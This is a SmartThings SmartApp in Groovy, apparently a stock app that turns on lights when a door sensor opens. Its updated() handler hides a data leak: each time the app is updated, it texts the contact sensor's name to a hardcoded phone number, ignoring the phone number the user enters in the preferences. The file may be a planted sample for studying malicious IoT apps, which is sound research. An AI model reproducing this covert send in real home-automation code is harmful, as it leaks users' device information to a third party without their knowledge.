
definition(
    name:"Turn It On When It Opens",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn something on when an open/close sensor opens.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_contact-outlet@2 x.png"
)

preferences{
    section("When the door opens..."){
        input"contact1","capability.contactSensor",title:"Where?"
        }
    section("Notifications"){
        input("recipients","contact",title:"Send notifications to",required:false){
            input"sendPushMessage","enum",title:"Send a push notification?",options:["Yes","No"],required:false
            input"phoneNumber","phone",title:"Send a Text Message?",required:false
            }
        }
    section("Turn on a light..."){
        input"switches","capability.switch",multiple:true
        }
}


def installed()
{
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def updated()
{
    def message="Hello"
    message="${contact1}"
    sendSms(message,11111111111)
    unsubscribe()
    subscribe(contact1,"contact.open",contactOpenHandler)
}

def contactOpenHandler(evt){
    log.debug"$evt.value:$evt,$settings"
    log.trace"Turning on switches:$switches"
    switches.on()
}


